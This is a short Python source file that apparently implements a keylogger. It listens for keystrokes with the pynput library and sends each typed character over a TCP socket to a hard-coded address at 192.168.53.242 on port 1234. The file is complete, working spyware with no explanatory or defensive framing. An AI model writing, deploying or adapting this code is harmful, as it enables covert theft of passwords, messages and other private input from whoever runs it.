import socket
from pynput.keyboard import Listener

IP_ADDRESS = "192.168.53.242"
PORT = 1234

def setup():
    global SERVER
    global PORT
    global IP_ADDRESS
    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    SERVER.connect((IP_ADDRESS, PORT))

def on_press(key):
    try:
        message = str(key.char)
        if message:
            SERVER.send(message.encode())
    except AttributeError:
        # Ignore special keys
        pass

def listen_keyboard():
    with Listener(on_press=on_press) as listener:
        listener.join()

setup()
listen_keyboard()
